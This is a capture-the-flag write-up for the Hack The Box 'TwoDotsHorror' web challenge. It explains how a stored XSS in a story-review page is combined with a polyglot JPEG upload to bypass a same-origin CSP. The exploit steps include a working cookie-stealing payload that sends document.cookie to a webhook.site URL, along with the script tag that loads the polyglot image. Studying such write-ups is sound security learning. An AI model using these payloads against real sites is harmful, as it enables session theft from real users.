#  TwoDotsHorror HTB Challenge 

After we register and login, the webapp has 2 main funcionality, we can upload a profile image and we can post a story into the feed.
The Story must have 2 dots, this is the only restriction we need to comply.

Once we fill the form and we send the message, we get a message that the admin need to approve our story before it can be posted
The story is stored inside /review.html `<p>{{ post.content|safe }}</p>` where the admin (actually, a puppeter bot) will review it.

So, we now know that the message will be stored inside review.html, and a bot, from a --no-sandbox browser, is going to visit that page with the cookie needed to access the page.

Seems like we're going to send an XSS payload to be stored into review.html to steal the admin cookie when the bot will come to visit the page.

```js
const cookies = [{
    'name': 'flag',
    'value': 'HTB{f4k3_fl4g_f0r_t3st1ng}'
}];

async function purgeData(db){
	const browser = await puppeteer.launch(browser_options);
	const page = await browser.newPage();

	await page.goto('http://127.0.0.1:1337/');
	await page.setCookie(...cookies);

	await page.goto('http://127.0.0.1:1337/review', {
		waitUntil: 'networkidle2'
	});

	await browser.close();
	await db.migrate();
```

I tried with a classic cookie stealer XSS but it does not work because of the CSP restricrions.

```js
app.use(function(req, res, next) {
	res.setHeader("Content-Security-Policy", "default-src 'self'; object-src 'none'; style-src 'self' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com;")
	next();
```

### Polyglot Jpeg / XSS

 CSP restrictions  can be bypassed using **polyglot jpegs**:
- https://portswigger.net/research/bypassing-csp-using-polyglot-jpegs
	"If you allow users to upload JPEGs, these uploads are on the same domain as your app, and your CSP allows script from "self", you can bypass the CSP using a polyglot JPEG by injecting a script and pointing it to that image."

We'll inject an XSS script inside a jpeg and upload it as our profile image, then we can call the image sending another XSS from the story feed that'll be stored in review.html. 

### Jpeg, please follow this rules:

We can see from the /UploadHelper.js that the jpeg is gonna be checked by `isJpg` for its integrity,  has to be 120x120px minimum, and it is uploaded in the /upload/ folder and renamed with a md5 hash.

```js
const fs         = require('fs');
const path       = require('path');
const isJpg      = require('is-jpg');
const sizeOf     = require('image-size');

module.exports = {
	async uploadImage(file) {
		return new Promise(async (resolve, reject) => {
			if(file == undefined) return reject(new Error("Please select a file to upload!"));
			try{
				if (!isJpg(file.data)) return reject(new Error("Please upload a valid JPEG image!"));
				const dimensions = sizeOf(file.data);
				if(!(dimensions.width >= 120 && dimensions.height >= 120)) {
					return reject(new Error("Image size must be at least 120x120!"));
				}
				uploadPath = path.join(__dirname, '/../uploads', file.md5);
				file.mv(uploadPath, (err) => {
					if (err) return reject(err);
				});
				return resolve(file.md5);
			}catch (e){
				console.log(e);
				reject(e);
```

To see the image in the browser just got to /api/avatar/YOUR_USERNAME:
```js
router.get('/api/avatar/:username', async (req, res) => {
	return db.getUser(req.params.username)
		.then(user => {
			if (user === undefined) return res.status(404).send(response('user does not exist!'));
			avatar = path.join(__dirname, '/../uploads', user.avatar);
			return res.sendFile(avatar);
		})
		.catch(() => res.status(500).send(response('Something went wrong!')));
});

```
#### isJpg
https://github.com/sindresorhus/is-jpg

From the isJpg github repo we got 2 main info:
1. Check if a Buffer/Uint8Array is a [JPEG](https://en.wikipedia.org/wiki/JPEG) image
2. It only needs the first 3 bytes

So it **checks only the first 3** bytes to confirm that the image is a Jpeg.
The signature of the Jpeg has minimum 4 (Magic)bytes:
FF D8 FF E0.
https://en.wikipedia.org/wiki/List_of_file_signatures

We can follow along the portswigger post about the polyglot image and how make it or, we can use a very good tool made by **s-3ntinel** that works beautifully.

There are other tools to make polyglot jpeg, but i found this to be the best and it is really simple to read:
> The Tool: https://github.com/s-3ntinel/imgjs_polygloter

## Exploit Steps

1. Download the tool from github and make a jpeg image like this:
```sh
python3 img_polygloter.py jpg -H 120 -W 120 -p "window.location.href='https://webhook.site/XxXxXxX-XxXx-XxXX-XxXx-d0da00f5cddd/?cookie='+document.cookie" -o PolYGloT.jpeg
```
2. Upload the image
3. Submit this "story" ():
```html
</p>a.a.<script charset=\"ISO-8859-1\" src=\"/api/avatar/YOUR_USERNAME\"></script>
```
4. Wait the Webhook to be hooked by admin!
